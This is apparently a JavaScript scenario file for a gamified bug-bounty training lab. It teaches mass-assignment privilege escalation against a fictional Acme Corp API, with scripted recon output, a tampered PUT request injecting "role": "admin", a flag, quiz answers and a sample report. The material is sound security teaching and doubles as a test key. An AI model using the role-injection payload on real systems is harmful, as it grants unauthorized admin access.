// ==========================================================
// SCENARIO 004: MASS ASSIGNMENT PRIVILEGE ESCALATION
// ==========================================================

window.scenario_004 = {
  steps: [
    {
      name: "Mission Brief",
      workspace: "markdown",
      xpReward: 100,
      description: `
### Target: app.acme-corp.com (API Profile Manager)
You are auditing the profile administration portal of Acme Corp. Modern web frameworks allow developers to automatically bind HTTP request parameters (like JSON payloads) directly to database models. If not restricted, this can lead to Mass Assignment vulnerabilities.

#### Objective:
- Discover parameters used in account registration or profile updates.
- Test if you can inject variables to modify user access privileges.

Click **Next Step** to identify target paths.
      `
    },
    {
      name: "Endpoint Enumeration",
      workspace: "recon",
      xpReward: 150,
      description: `
### Searching API Endpoints
Scan the target domain for user registration or profile modification URLs.
      `,
      terminalCommands: [
        {
          name: "katana -u https://app.acme-corp.com/ -silent | grep profile",
          correct: true,
          evidence: {
            title: "Profile Management Endpoint",
            content: "PUT /api/v1/users/profile"
          },
          output: [
            { text: "[INF] Executing Katana active parsing...", type: "info" },
            { text: "https://app.acme-corp.com/api/v1/users/profile", type: "out" },
            { text: "https://app.acme-corp.com/api/v1/users/profile/settings", type: "out" },
            { text: "[INF] Analysis finished. Active endpoint PUT /api/v1/users/profile resolved.", type: "success" }
          ]
        }
      ],
      thoughts: `
> [!NOTE]
> Mass assignment (or auto-binding) occurs when a framework automatically maps client input parameters to internal model properties without explicit whitelisting.
      `
    },
    {
      name: "Parameter Injection Auditing",
      workspace: "markdown",
      xpReward: 150,
      description: `
### Analyzing JSON Attributes
When updating your profile information, the application transmits a JSON body containing your username and email.
The backend responds with:
\`\`\`json
{
  "id": 55,
  "username": "hunter",
  "email": "hunter@recon.com",
  "role": "user"
}
\`\`\`

Notice the presence of the \`"role": "user"\` property in the response structure. What happens if we append this attribute directly to our edit request payload?
      `,
      choices: [
        {
          text: "A) Try bypassing CSRF protection on the endpoint first",
          correct: false,
          xp: -10,
          timePenalty: 5,
          outcome: "The endpoint uses JSON format, making CSRF less relevant here. We are trying to audit permissions, not CSRF."
        },
        {
          text: "B) Inject the 'role' parameter in the update JSON request",
          correct: true,
          xp: 50,
          outcome: "You decide to add '\"role\": \"admin\"' in the request JSON profile block to see if the database model accepts the change."
        },
        {
          text: "C) Tamper with the Cookie header value directly",
          correct: false,
          xp: -10,
          timePenalty: 3,
          outcome: "Modifying cookie values results in authorization errors as the session is stored server-side."
        }
      ]
    },
    {
      name: "Burp Parameter Injection",
      workspace: "burp",
      xpReward: 200,
      description: `
### Modifying Request JSON properties
 Tamper with the PUT request parameters in Burp. Add the \`role\` field and set its value to \`admin\`.
      `,
      burpRequest: "PUT /api/v1/users/profile HTTP/1.1\nHost: app.acme-corp.com\nContent-Type: application/json\nAuthorization: Bearer user_session_jwt\n\n{\n  \"username\": \"hunter\",\n  \"email\": \"hunter@recon.com\"\n}",
      burpResponse: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"id\": 55,\n  \"username\": \"hunter\",\n  \"email\": \"hunter@recon.com\",\n  \"role\": \"user\"\n}",
      burpActions: [
        {
          name: "Inject 'role': 'admin' parameter",
          correct: true,
          modifiedRequest: "PUT /api/v1/users/profile HTTP/1.1\nHost: app.acme-corp.com\nContent-Type: application/json\nAuthorization: Bearer user_session_jwt\n\n{\n  \"username\": \"hunter\",\n  \"email\": \"hunter@recon.com\",\n  \"role\": \"admin\"\n}",
          modifiedResponse: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"id\": 55,\n  \"username\": \"hunter\",\n  \"email\": \"hunter@recon.com\",\n  \"role\": \"admin\",\n  \"flag_alert\": \"FLAG{mass_assignment_privilege_escalation_ok}\"\n}",
          evidence: {
            title: "Privilege Escalation via JSON Injection",
            content: "PUT /api/v1/users/profile\nPayload: {\"role\": \"admin\"}\nResponse: {\"role\": \"admin\"}"
          }
        }
      ]
    },
    {
      name: "Exploitation & Capture",
      workspace: "lab",
      xpReward: 300,
      instructions: "Access the updated admin panel at app.acme-corp.com using your elevated administrator privileges and retrieve the flag located in the admin settings dashboard.",
      targetUrl: "https://app.acme-corp.com/api/v1/users/profile",
      correctFlag: "FLAG{mass_assignment_privilege_escalation_ok}"
    },
    {
      name: "Report Writing",
      workspace: "report",
      xpReward: 250
    },
    {
      name: "Bounty & Review",
      workspace: "review"
    },
    {
      name: "Lessons Learned",
      workspace: "quiz",
      quizData: [
        {
          question: "What is Mass Assignment?",
          options: [
            "Assigning multiple servers to handle website traffic.",
            "Binding HTTP request parameters directly to model objects without whitelisting allowed properties.",
            "A database backup replication process.",
            "Compiling multiple software packages concurrently."
          ],
          answer: 1
        },
        {
          question: "How do you protect applications against Mass Assignment?",
          options: [
            "Use whitelists or Data Transfer Objects (DTOs) to restrict which parameters can be bound to models.",
            "Convert all incoming parameters to uppercase.",
            "Implement multi-factor authentication.",
            "Restrict HTTP requests to POST only."
          ],
          answer: 0
        }
      ]
    }
  ],
  realReport: {
    title: "Mass Assignment vulnerability in profile update endpoint leading to vertical Privilege Escalation",
    severity: "High",
    type: "PrivEsc",
    desc: "The profile update endpoint at /api/v1/users/profile maps JSON attributes directly to the user model database instance. Because the developers did not define a strict parameter whitelist, an authenticated user can include the 'role' attribute set to 'admin' in their update request, elevating their privileges.",
    steps: "1. Log in and intercept the profile update request: PUT /api/v1/users/profile.\n2. In the JSON request body, add: '\"role\": \"admin\"'.\n3. Submit the request. The response returns '\"role\": \"admin\"', confirming privilege escalation.",
    impact: "An attacker can escalate their privileges to administrator status, allowing full control over the application dashboard, databases, and other accounts.",
    feedback: "High quality report! The mass assignment vulnerability has been verified. We have updated our user controllers to use explicit DTO validation whitelists. Bounty awarded.",
    keywords: ["assignment", "role"]
  }
};
